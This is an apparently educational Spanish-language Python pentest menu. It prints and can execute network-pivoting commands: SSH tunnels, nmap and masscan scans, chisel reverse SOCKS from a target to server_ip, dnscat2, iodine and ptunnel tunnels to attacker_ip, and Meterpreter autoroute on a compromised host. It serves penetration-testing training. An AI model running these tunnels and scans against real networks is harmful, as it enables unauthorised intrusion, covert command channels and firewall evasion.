#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║          NETWORK PIVOTING & DISCOVERY TOOLKIT                ║
║          Reescrito en Python - Enfoque Educativo             ║
║          Autor: Oliver - github.com/oliverexx                ║
╚══════════════════════════════════════════════════════════════╝

USO ÉTICO: Esta herramienta es exclusivamente para entornos
de laboratorio, CTFs o redes donde tengas autorización explícita.
"""

import subprocess
import sys
import os
import shutil
import socket
import ipaddress
import time
import argparse
from datetime import datetime
from typing import Optional


# ─────────────────────────────────────────────
#  COLORES (ANSI)
# ─────────────────────────────────────────────
class C:
    RED     = "\033[0;31m"
    GREEN   = "\033[0;32m"
    YELLOW  = "\033[1;33m"
    BLUE    = "\033[0;34m"
    CYAN    = "\033[0;36m"
    MAGENTA = "\033[0;35m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    NC      = "\033[0m"

def red(t):     return f"{C.RED}{t}{C.NC}"
def green(t):   return f"{C.GREEN}{t}{C.NC}"
def yellow(t):  return f"{C.YELLOW}{t}{C.NC}"
def blue(t):    return f"{C.BLUE}{t}{C.NC}"
def cyan(t):    return f"{C.CYAN}{t}{C.NC}"
def magenta(t): return f"{C.MAGENTA}{t}{C.NC}"
def bold(t):    return f"{C.BOLD}{t}{C.NC}"
def dim(t):     return f"{C.DIM}{t}{C.NC}"


# ─────────────────────────────────────────────
#  CONFIG GLOBAL
# ─────────────────────────────────────────────
class Config:
    jump_host      = "192.168.1.100"
    target_network = "192.168.2.0/24"
    local_port     = 1080
    remote_port    = 3389
    socks_port     = 1080
    ssh_user       = "user"
    log_enabled    = False
    log_file       = f"pivot_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

cfg = Config()


# ─────────────────────────────────────────────
#  HELPERS DE UI
# ─────────────────────────────────────────────
def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear()
    print(blue("═" * 66))
    print(bold(blue("  NETWORK PIVOTING & DISCOVERY TOOLKIT  ·  Python Edition")))
    print(blue("═" * 66))
    print(dim(f"  Jump Host      : {cfg.jump_host}"))
    print(dim(f"  Target Network : {cfg.target_network}"))
    print(dim(f"  SOCKS Port     : {cfg.socks_port}"))
    print(dim(f"  Logging        : {'ON → ' + cfg.log_file if cfg.log_enabled else 'OFF'}"))
    print(blue("─" * 66))
    print()

def pause():
    input(yellow("\n  [Enter para continuar...]"))

def section(title: str):
    print()
    print(cyan(f"  ┌─ {title} " + "─" * max(0, 58 - len(title)) + "┐"))

def show_command(cmd: str, description: str):
    """Muestra un comando con descripción y pregunta si ejecutarlo."""
    print()
    print(f"  {green('▸')} {bold(description)}")
    print(f"  {yellow('$')} {cyan(cmd)}")

def log(text: str):
    if cfg.log_enabled:
        with open(cfg.log_file, "a") as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")


# ─────────────────────────────────────────────
#  VERIFICACIÓN DE HERRAMIENTAS
# ─────────────────────────────────────────────
TOOLS = {
    "nmap":         "Escaneo de puertos y servicios",
    "masscan":      "Escaneo ultrarrápido de redes",
    "netdiscover":  "Descubrimiento ARP",
    "responder":    "Captura de hashes NTLM",
    "bettercap":    "Análisis MitM",
    "chisel":       "TCP/UDP tunneling",
    "sshuttle":     "VPN-like sobre SSH",
    "proxychains":  "Encadenado de proxies",
    "ssh":          "Secure Shell",
    "python3":      "Python 3",
    "iodine":       "DNS tunneling",
    "ptunnel":      "ICMP tunneling",
}

def check_tools() -> dict[str, bool]:
    return {tool: shutil.which(tool) is not None for tool in TOOLS}

def show_tool_status():
    banner()
    section("Estado de Herramientas Instaladas")
    print()
    status = check_tools()
    installed = [t for t, ok in status.items() if ok]
    missing   = [t for t, ok in status.items() if not ok]

    print(f"  {green('✔ Instaladas')}  ({len(installed)})")
    for t in installed:
        print(f"      {green('●')} {t:<16} {dim(TOOLS[t])}")

    print()
    print(f"  {red('✘ No encontradas')}  ({len(missing)})")
    for t in missing:
        print(f"      {red('○')} {t:<16} {dim(TOOLS[t])}")

    print()
    if missing:
        print(yellow(f"  Tip: instala herramientas faltantes con apt/brew/go."))
    pause()


# ─────────────────────────────────────────────
#  EJECUCIÓN REAL DE COMANDOS
# ─────────────────────────────────────────────
def run_command(cmd: str, description: str, dry_run: bool = False):
    """
    Muestra el comando, pide confirmación y lo ejecuta (o simula).
    Captura output en tiempo real.
    """
    print()
    print(f"  {green('▸')} {bold(description)}")
    print(f"  {yellow('$')} {cyan(cmd)}")
    print()

    tool = cmd.split()[0]
    if not dry_run and not shutil.which(tool):
        print(red(f"  ✘ '{tool}' no está instalado. Saltando ejecución."))
        log(f"SKIP (not installed): {cmd}")
        return

    confirm = input(f"  {magenta('¿Ejecutar este comando? [s/N/d(dry)]')} ").strip().lower()

    if confirm == "d" or dry_run:
        print(dim("  [Dry-run] Comando no ejecutado."))
        log(f"DRY-RUN: {cmd}")
        return

    if confirm != "s":
        print(dim("  Saltado."))
        return

    print(blue("─" * 66))
    log(f"EXEC: {cmd}")

    try:
        process = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        for line in process.stdout:
            sys.stdout.write(f"  {dim(line)}")
            log(f"OUT: {line.rstrip()}")
        process.wait()
        rc = process.returncode
        status = green(f"✔ Salió con código {rc}") if rc == 0 else red(f"✘ Código de salida: {rc}")
        print(f"\n  {status}")
        log(f"EXIT CODE: {rc}")
    except KeyboardInterrupt:
        print(yellow("\n  Interrumpido por el usuario."))
        log("INTERRUPTED")
    except Exception as e:
        print(red(f"  Error: {e}"))

    print(blue("─" * 66))


# ─────────────────────────────────────────────
#  AUTO-DETECCIÓN DE RED
# ─────────────────────────────────────────────
def detect_network():
    banner()
    section("Auto-detección de Interfaces y Red")
    print()

    # Interfaces activas (Linux/macOS)
    try:
        result = subprocess.run(
            ["ip", "-o", "addr", "show"],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"  {bold('Interfaces detectadas:')}")
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 4 and parts[2] in ("inet", "inet6"):
                    iface = parts[1]
                    addr  = parts[3]
                    print(f"    {green('●')} {iface:<12} {cyan(addr)}")
        else:
            raise Exception("ip no disponible")
    except Exception:
        # fallback macOS / sistemas sin 'ip'
        try:
            result = subprocess.run(["ifconfig"], capture_output=True, text=True)
            print(dim("  (salida de ifconfig — usa 'ip addr' para más detalle)"))
            for line in result.stdout.splitlines()[:20]:
                print(f"  {dim(line)}")
        except Exception:
            print(yellow("  No se pudo detectar interfaces automáticamente."))

    # Gateway por defecto
    print()
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True
        )
        if result.returncode == 0 and result.stdout.strip():
            print(f"  {bold('Gateway por defecto:')}")
            print(f"    {green(result.stdout.strip())}")
    except Exception:
        pass

    # Reachability del jump host
    print()
    print(f"  {bold('Verificando alcance de Jump Host')} ({cfg.jump_host})...")
    try:
        result = subprocess.run(
            ["ping", "-c", "2", "-W", "1", cfg.jump_host],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            print(f"  {green('✔')} {cfg.jump_host} es alcanzable.")
        else:
            print(f"  {red('✘')} {cfg.jump_host} no responde a ping.")
    except Exception:
        print(yellow("  No se pudo verificar alcance del jump host."))

    pause()


# ─────────────────────────────────────────────
#  MÓDULOS DE CONTENIDO EDUCATIVO
# ─────────────────────────────────────────────

# ── SSH TUNNELING ────────────────────────────
def module_ssh_local():
    banner()
    section("SSH · Local Port Forwarding")
    print(f"""
  {bold('Concepto:')}
    Abre un puerto en tu máquina local que redirige tráfico
    a través del jump host hacia un host interno.

    [Tu PC :LOCAL_PORT] ──SSH──► [Jump Host] ──► [Host Interno :REMOTE_PORT]

  {bold('Cuándo usarlo:')}
    - Acceder a RDP/SMB de hosts internos desde tu máquina.
    - El host interno no es accesible directamente desde Internet.
""")
    cmds = [
        (f"ssh -L {cfg.local_port}:internal_host:{cfg.remote_port} {cfg.ssh_user}@{cfg.jump_host}",
         "Forward RDP (puerto único)"),
        (f"ssh -L 445:internal_host:445 {cfg.ssh_user}@{cfg.jump_host}",
         "Forward SMB"),
        (f"ssh -L {cfg.local_port}:internal_host:{cfg.remote_port} -N -f {cfg.ssh_user}@{cfg.jump_host}",
         "Forward en background (no shell interactiva)"),
        (f"ssh -L 9000-9010:internal_host:9000-9010 {cfg.ssh_user}@{cfg.jump_host}",
         "Forward de rango de puertos"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_ssh_remote():
    banner()
    section("SSH · Remote Port Forwarding")
    print(f"""
  {bold('Concepto:')}
    Expone un puerto de tu máquina local en el jump host.
    Útil para recibir conexiones reverse desde la red interna.

    [Jump Host :REMOTE_PORT] ◄──SSH──── [Tu PC] ──► [Servicio Local]

  {bold('Cuándo usarlo:')}
    - Recibir reverse shells de hosts internos.
    - Bypasear NAT cuando el jump host sí tiene IP pública.
""")
    cmds = [
        (f"ssh -R {cfg.remote_port}:localhost:80 {cfg.ssh_user}@{cfg.jump_host}",
         "Exponer web local en el jump host"),
        (f"ssh -R 2222:localhost:22 {cfg.ssh_user}@{cfg.jump_host}",
         "Exponer SSH local"),
        (f"ssh -R 0.0.0.0:{cfg.remote_port}:internal_host:{cfg.remote_port} {cfg.ssh_user}@{cfg.jump_host}",
         "Exponer en todas las interfaces del jump host"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_ssh_dynamic():
    banner()
    section("SSH · Dynamic Port Forwarding (SOCKS Proxy)")
    print(f"""
  {bold('Concepto:')}
    Crea un proxy SOCKS en tu máquina. Todo el tráfico que
    lo use será enrutado a través del jump host.

    [Tu App] ──SOCKS:{cfg.socks_port}──► [Tu PC] ──SSH──► [Jump Host] ──► [Destino]

  {bold('Cuándo usarlo:')}
    - Navegar la red interna completa sin rutas estáticas.
    - Usar con proxychains para redirigir cualquier herramienta.
""")
    cmds = [
        (f"ssh -D {cfg.socks_port} {cfg.ssh_user}@{cfg.jump_host}",
         "SOCKS proxy interactivo"),
        (f"ssh -D {cfg.socks_port} -q -N -f {cfg.ssh_user}@{cfg.jump_host}",
         "SOCKS en background (silencioso)"),
        (f"ssh -D {cfg.socks_port} -C {cfg.ssh_user}@{cfg.jump_host}",
         "SOCKS con compresión"),
        (f"proxychains nmap -sT -p 80,443,445,3389 192.168.2.1",
         "Usar proxychains con el proxy activo"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_ssh_jump():
    banner()
    section("SSH · ProxyJump (múltiples saltos)")
    print(f"""
  {bold('Concepto:')}
    Encadena múltiples hosts SSH para llegar a destinos
    profundamente anidados en la red.

    [Tu PC] ──SSH──► [Jump1] ──SSH──► [Jump2] ──SSH──► [Destino]

  {bold('Cuándo usarlo:')}
    - Redes segmentadas con múltiples DMZ/firewalls.
    - Penetration testing de infraestructuras complejas.
""")
    cmds = [
        (f"ssh -J {cfg.ssh_user}@{cfg.jump_host} {cfg.ssh_user}@internal_host",
         "Un solo salto (ProxyJump)"),
        (f"ssh -J user1@jump1,user2@jump2 user3@destino_final",
         "Dos saltos encadenados"),
        (f"ssh -J {cfg.ssh_user}@{cfg.jump_host} -L {cfg.local_port}:localhost:{cfg.remote_port} {cfg.ssh_user}@internal_host",
         "Port forward a través de ProxyJump"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)

    print()
    section("Configuración ~/.ssh/config equivalente")
    config_example = f"""
  Host jump
      HostName {cfg.jump_host}
      User {cfg.ssh_user}
      IdentityFile ~/.ssh/id_rsa

  Host interno
      HostName internal_host
      User {cfg.ssh_user}
      ProxyJump jump
      LocalForward {cfg.local_port} localhost:{cfg.remote_port}
"""
    print(cyan(config_example))
    print(dim("  Con esta config solo necesitás: ssh interno"))
    pause()


# ── DISCOVERY ────────────────────────────────
def module_nmap():
    banner()
    section("Nmap · Escaneo y Enumeración")
    print(f"""
  {bold('Concepto:')}
    Nmap es el estándar para descubrimiento de hosts,
    servicios, versiones y detección de vulnerabilidades.

  {bold('Fases típicas en un engagement:')}
    1. Host discovery  →  ¿Quién está vivo?
    2. Port scan       →  ¿Qué puertos abiertos?
    3. Service scan    →  ¿Qué servicios/versiones?
    4. Script scan     →  ¿Vulnerabilidades conocidas?
""")
    cmds = [
        (f"nmap -sn {cfg.target_network}",
         "Phase 1 · Host discovery (sin port scan)"),
        (f"nmap -p- --min-rate 5000 --open -T4 {cfg.target_network}",
         "Phase 2 · Todos los puertos, rápido"),
        (f"nmap -sV -sC -p 22,80,443,445,3389 {cfg.target_network}",
         "Phase 3 · Versiones y scripts por defecto"),
        (f"nmap --script vuln -p 80,443,445 {cfg.target_network}",
         "Phase 4 · Detección de vulnerabilidades"),
        (f"nmap -sU -p 53,67,123,161 --open {cfg.target_network}",
         "Bonus · Escaneo UDP (servicios importantes)"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_masscan():
    banner()
    section("Masscan · Escaneo Ultrarrápido")
    print(f"""
  {bold('Concepto:')}
    Masscan puede escanear miles de hosts por segundo.
    Ideal para reconocimiento inicial en redes grandes.

  {bold('Trade-off:')}
    Velocidad  ▲  ←→  Precisión ▼
    Para confirmación, siempre validá con nmap después.
""")
    cmds = [
        (f"masscan -p80,443,22,3389,445 {cfg.target_network} --rate 5000",
         "Puertos comunes, velocidad moderada"),
        (f"masscan -p1-65535 {cfg.target_network} --rate 10000 -oX masscan_out.xml",
         "Todos los puertos, exportar a XML"),
        (f"masscan --ping {cfg.target_network} --rate 1000",
         "Solo ping sweep (host discovery)"),
        (f"nmap -sV -p- -iL masscan_ips.txt",
         "Validar resultados de masscan con nmap"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_netdiscover():
    banner()
    section("Netdiscover · ARP Discovery")
    print(f"""
  {bold('Concepto:')}
    Usa paquetes ARP para descubrir hosts en la LAN.
    Más confiable que ICMP en redes internas (el firewall
    no puede bloquear ARP en la misma subred).

  {bold('Modos:')}
    Activo  → Envía ARP requests (más rápido, detectable)
    Pasivo  → Solo escucha tráfico ARP (más sigiloso)
""")
    cmds = [
        (f"netdiscover -i eth0 -r {cfg.target_network}",
         "Descubrimiento ARP activo"),
        (f"netdiscover -p -i eth0",
         "Modo pasivo (solo escucha, sigiloso)"),
        (f"netdiscover -f -i eth0 -r {cfg.target_network}",
         "Modo rápido (menos verificación)"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()


# ── HERRAMIENTAS AVANZADAS ────────────────────
def module_chisel():
    banner()
    section("Chisel · TCP/UDP Tunneling (sin SSH)")
    print(f"""
  {bold('Concepto:')}
    Chisel crea túneles TCP/UDP sobre HTTP/WebSockets.
    Escrito en Go → un solo binario, fácil de transferir.

  {bold('Cuándo usarlo:')}
    - El target no tiene SSH pero sí tiene salida HTTP/HTTPS.
    - Necesitás traversal de firewalls restrictivos.

  {bold('Flujo:')}
    [Tu PC: servidor chisel] ◄──HTTP──── [Target: cliente chisel]
    Luego usás proxychains o port forward localmente.
""")
    cmds = [
        ("chisel server -p 8080 --reverse",
         "Servidor Chisel (en tu máquina)"),
        ("chisel client server_ip:8080 R:1080:socks",
         "Cliente → SOCKS inverso (en el target)"),
        ("chisel client server_ip:8080 R:3389:internal_host:3389",
         "Cliente → Reverse port forward RDP"),
        ("chisel client server_ip:8080 0.0.0.0:445:target:445",
         "Cliente → Local port forward SMB"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_sshuttle():
    banner()
    section("sshuttle · VPN Transparente sobre SSH")
    print(f"""
  {bold('Concepto:')}
    sshuttle crea una VPN-like transparente sobre SSH.
    No requiere root en el cliente, sí en el servidor.
    Todo el tráfico hacia la red target pasa por el jump host.

  {bold('Ventaja sobre SOCKS:')}
    No necesitás proxychains. Funciona de forma transparente
    para cualquier aplicación, incluyendo resolución DNS.
""")
    cmds = [
        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} {cfg.target_network}",
         "VPN para toda la red target"),
        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} --dns {cfg.target_network}",
         "Incluir DNS tunneling"),
        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} -x {cfg.jump_host}/32 {cfg.target_network}",
         "Excluir el jump host del tunnel"),
        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} 0.0.0.0/0",
         "Rutar TODO el tráfico (full VPN)"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_proxychains():
    banner()
    section("Proxychains · Encadenado de Proxies")
    print(f"""
  {bold('Concepto:')}
    proxychains fuerza cualquier conexión TCP de una
    aplicación a través de una cadena de proxies SOCKS/HTTP.

  {bold('Flujo típico:')}
    1. Levantar proxy SOCKS (ssh -D o chisel)
    2. Configurar /etc/proxychains.conf
    3. Prefixar cualquier comando con 'proxychains'
""")
    config_example = f"""
  # /etc/proxychains.conf
  strict_chain          # falla si un proxy no responde
  # dynamic_chain       # saltar proxies caídos
  proxy_dns             # resolver DNS a través del proxy
  [ProxyList]
  socks5  127.0.0.1  {cfg.socks_port}
"""
    print(cyan(config_example))

    cmds = [
        (f"echo 'socks5 127.0.0.1 {cfg.socks_port}' >> /etc/proxychains.conf",
         "Agregar proxy SOCKS5"),
        (f"proxychains nmap -sT -p 22,80,445,3389 192.168.2.1",
         "Nmap a través del proxy (solo -sT funciona)"),
        (f"proxychains xfreerdp /v:192.168.2.10 /u:administrator",
         "RDP a través del proxy"),
        (f"proxychains curl http://internal.corp/",
         "HTTP a través del proxy"),
    ]
    for cmd, desc in cmds:
        run_command(cmd, desc)
    pause()

def module_metasploit():
    banner()
    section("Metasploit · Pivoting con Meterpreter")
    print(f"""
  {bold('Concepto:')}
    Con una sesión Meterpreter activa podés agregar rutas
    para que el framework haga pivoting automáticamente.

  {bold('Flujo:')}
    1. Obtener sesión Meterpreter en host comprometido
    2. Agregar ruta hacia la red interna (autoroute)
    3. Levantar SOCKS proxy del framework
    4. Usar proxychains para cualquier herramienta externa
""")
    msf_script = """
  # Dentro de msfconsole, con sesión activa:

  meterpreter > run post/multi/manage/autoroute SUBNET=192.168.2.0/24 SESSION=1
  meterpreter > background

  msf6 > use auxiliary/server/socks_proxy
  msf6 auxiliary(socks_proxy) > set VERSION 5
  msf6 auxiliary(socks_proxy) > set SRVPORT 1080
  msf6 auxiliary(socks_proxy) > run -j

  # Port forward directo desde meterpreter:
  meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.2.10
  meterpreter > portfwd list
  meterpreter > portfwd delete -l 3389 -p 3389 -r 192.168.2.10
"""
    print(cyan(msf_script))
    print(yellow("  Nota: estos comandos se ejecutan DENTRO de msfconsole, no en bash."))
    pause()

def module_dns_icmp():
    banner()
    section("DNS / ICMP Tunneling · Evasión de Firewalls")
    print(f"""
  {bold('Cuándo usarlo:')}
    Redes muy restrictivas donde SOLO el puerto 53 (DNS)
    o el protocolo ICMP (ping) están permitidos.

  {bold('DNS Tunneling (dnscat2 / iodine):')}
    Los datos se encapsulan en queries/respuestas DNS.
    Requiere dominio propio con NS apuntando a tu servidor.

  {bold('ICMP Tunneling (ptunnel):')}
    Los datos se encapsulan en el payload de paquetes ICMP.
    Bajo ancho de banda pero muy sigiloso.
""")
    cmds_dns = [
        ("dnscat2-server --dns host=attacker_ip,port=53 --secret=mysecret",
         "dnscat2 · Servidor (en tu máquina)"),
        ("dnscat2 victim.com --secret=mysecret",
         "dnscat2 · Cliente (en el target)"),
        ("iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com",
         "iodine · Servidor DNS tunnel"),
        ("iodine -f -P password tunnel.yourdomain.com",
         "iodine · Cliente DNS tunnel"),
    ]
    cmds_icmp = [
        ("ptunnel -x password",
         "ptunnel · Servidor ICMP (en tu máquina)"),
        ("ptunnel -p attacker_ip -lp 1080 -da target_ip -dp 3389 -x password",
         "ptunnel · Cliente ICMP"),
    ]
    print(f"\n  {bold('── DNS ──')}")
    for cmd, desc in cmds_dns:
        run_command(cmd, desc)
    print(f"\n  {bold('── ICMP ──')}")
    for cmd, desc in cmds_icmp:
        run_command(cmd, desc)
    pause()


# ─────────────────────────────────────────────
#  MENÚS
# ─────────────────────────────────────────────
def menu_ssh():
    options = {
        "1": ("SSH Local Port Forwarding",          module_ssh_local),
        "2": ("SSH Remote Port Forwarding",         module_ssh_remote),
        "3": ("SSH Dynamic (SOCKS Proxy)",          module_ssh_dynamic),
        "4": ("SSH ProxyJump (múltiples saltos)",   module_ssh_jump),
    }
    submenu("SSH Tunneling", options)

def menu_discovery():
    options = {
        "1": ("Nmap · Escaneo avanzado",            module_nmap),
        "2": ("Masscan · Escaneo rápido",           module_masscan),
        "3": ("Netdiscover · ARP Discovery",        module_netdiscover),
    }
    submenu("Herramientas de Discovery", options)

def menu_advanced():
    options = {
        "1": ("Chisel · TCP/UDP Tunneling",         module_chisel),
        "2": ("sshuttle · VPN sobre SSH",           module_sshuttle),
        "3": ("Proxychains · Config y uso",         module_proxychains),
        "4": ("Metasploit · Meterpreter Pivoting",  module_metasploit),
        "5": ("DNS / ICMP Tunneling",               module_dns_icmp),
    }
    submenu("Herramientas Avanzadas", options)

def submenu(title: str, options: dict):
    while True:
        banner()
        print(f"  {bold(title)}\n")
        for key, (label, _) in options.items():
            print(f"  {cyan(key)}.  {label}")
        print(f"  {cyan('0')}.  {dim('Volver')}")
        print()
        choice = input(f"  {yellow('▸')} Seleccioná una opción: ").strip()
        if choice == "0":
            break
        elif choice in options:
            options[choice][1]()
        else:
            print(red("  Opción no válida."))
            time.sleep(1)

def menu_config():
    while True:
        banner()
        print(f"  {bold('Configuración de Entorno')}\n")
        print(f"  {cyan('1')}.  Jump Host       → {cfg.jump_host}")
        print(f"  {cyan('2')}.  Target Network  → {cfg.target_network}")
        print(f"  {cyan('3')}.  SSH User        → {cfg.ssh_user}")
        print(f"  {cyan('4')}.  SOCKS Port      → {cfg.socks_port}")
        print(f"  {cyan('5')}.  Local Port      → {cfg.local_port}")
        print(f"  {cyan('6')}.  Remote Port     → {cfg.remote_port}")
        print(f"  {cyan('7')}.  Logging         → {'ON' if cfg.log_enabled else 'OFF'}")
        print(f"  {cyan('0')}.  {dim('Volver')}")
        print()
        choice = input(f"  {yellow('▸')} Seleccioná una opción: ").strip()

        if choice == "0":
            break
        elif choice == "1":
            val = input(f"  Nuevo Jump Host [{cfg.jump_host}]: ").strip()
            if val: cfg.jump_host = val
        elif choice == "2":
            val = input(f"  Nueva Target Network [{cfg.target_network}]: ").strip()
            if val:
                try:
                    ipaddress.ip_network(val, strict=False)
                    cfg.target_network = val
                except ValueError:
                    print(red("  Red inválida (formato: 192.168.1.0/24)"))
                    time.sleep(2)
        elif choice == "3":
            val = input(f"  SSH User [{cfg.ssh_user}]: ").strip()
            if val: cfg.ssh_user = val
        elif choice == "4":
            val = input(f"  SOCKS Port [{cfg.socks_port}]: ").strip()
            if val.isdigit(): cfg.socks_port = int(val)
        elif choice == "5":
            val = input(f"  Local Port [{cfg.local_port}]: ").strip()
            if val.isdigit(): cfg.local_port = int(val)
        elif choice == "6":
            val = input(f"  Remote Port [{cfg.remote_port}]: ").strip()
            if val.isdigit(): cfg.remote_port = int(val)
        elif choice == "7":
            cfg.log_enabled = not cfg.log_enabled
            status = green("ACTIVADO") if cfg.log_enabled else red("DESACTIVADO")
            print(f"  Logging {status} → {cfg.log_file}")
            time.sleep(2)


def main_menu():
    options = {
        "1": ("SSH Tunneling",                  menu_ssh),
        "2": ("Herramientas de Discovery",      menu_discovery),
        "3": ("Herramientas Avanzadas",         menu_advanced),
        "4": ("Auto-detección de Red",          detect_network),
        "5": ("Estado de Herramientas",         show_tool_status),
        "6": ("Configuración",                  menu_config),
    }
    while True:
        banner()
        print(f"  {bold('Menú Principal')}\n")
        for key, (label, _) in options.items():
            print(f"  {cyan(key)}.  {label}")
        print(f"  {cyan('0')}.  Salir")
        print()
        choice = input(f"  {yellow('▸')} Seleccioná una opción: ").strip()

        if choice == "0":
            print(green("\n  Hasta luego.\n"))
            sys.exit(0)
        elif choice in options:
            options[choice][1]()
        else:
            print(red("  Opción no válida."))
            time.sleep(1)


# ─────────────────────────────────────────────
#  PUNTO DE ENTRADA
# ─────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Network Pivoting & Discovery Toolkit - Versión Educativa"
    )
    parser.add_argument("--jump",    default=None, help="Jump host IP/hostname")
    parser.add_argument("--network", default=None, help="Target network CIDR (ej: 192.168.2.0/24)")
    parser.add_argument("--user",    default=None, help="Usuario SSH")
    parser.add_argument("--log",     action="store_true", help="Activar logging a archivo")
    parser.add_argument("--check",   action="store_true", help="Solo verificar herramientas y salir")
    args = parser.parse_args()

    if args.jump:    cfg.jump_host = args.jump
    if args.network: cfg.target_network = args.network
    if args.user:    cfg.ssh_user = args.user
    if args.log:     cfg.log_enabled = True

    if args.check:
        show_tool_status()
        sys.exit(0)

    try:
        main_menu()
    except KeyboardInterrupt:
        print(yellow("\n\n  Saliendo...\n"))
        sys.exit(0)
